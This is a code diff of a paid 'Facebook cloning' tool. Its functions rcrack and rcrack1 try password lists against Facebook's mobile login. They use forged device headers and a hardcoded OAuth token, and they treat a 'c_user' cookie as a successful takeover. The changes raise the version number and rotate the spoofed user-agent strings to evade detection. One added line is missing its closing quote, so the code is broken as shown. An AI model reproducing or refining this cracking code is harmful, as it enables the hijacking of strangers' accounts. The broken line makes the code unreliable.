@@ -117,7 +117,7 @@ logo=("""\033[1;32m
 {+}\033[1;32mCREATED BY     : \033[1;32mAB KHANX\033[1;32m
 {+}\033[1;32mFACEBOOK       : \033[1;32mAB KHANX\033[1;32m
 {+}\033[1;32mYOUTUBE        : \033[1;32mMSS TRICKS\033[1;32m
-{+}\033[1;32mVERSION        :\033[1;32m 15.2\033[1;32m
+{+}\033[1;32mVERSION        :\033[1;32m 15.3\033[1;32m
 {+}\033[1;32mSTATUS         :\033[1;32m PAID\033[1;32m
 --------------------------------------------------
 \033[1;37m[-]KINGX MR SW4T1
@@ -807,7 +807,7 @@ def rcrack1(ids,passlist):
 			'x-fb-sim-hni':str(random.randint(2e4,4e4)),
 			'x-fb-connection-type':'unknown',
 			'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-			'user-agent':'Mozilla/5.0 (Linux; Android 11; SM-M107F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36',
+			'user-agent': 'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Max Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/401.0.0.14.97;]
 			'x-fb-net-hni':str(random.randint(2e4,4e4)),
 			'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
 			'x-fb-connection-quality':'EXCELLENT',
@@ -871,7 +871,7 @@ def rcrack(ids,passlist):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 11; SM-A507FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.173 Mobile Safari/537.36',}
+            'user-agent': 'Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro Max Build/SKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36',}
 			lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			if 'c_user' in log_cookies:
@@ -925,7 +925,7 @@ def menu_apikey():
 {+}\033[1;32mCREATED BY     : \033[1;32mAB KHANX\033[1;32m
 (+}\033[1;32mFACEBOOK       : \033[1;32mAB KHANX\033[1;32m
 {+}\033[1;32mYOUTUBE        : \033[1;32mMSS TRICKS\033[1;32m
-{+}\033[1;32mVERSION        :\033[1;32m 15.2\033[1;32m
+{+}\033[1;32mVERSION        :\033[1;32m 15.3\033[1;32m
 {+}\033[1;32mSTATUS         :\033[1;32m PAID\033[1;32m
 --------------------------------------------------
 \033[1;33m[+]TOOLS  : FACEBOOK CLONING 
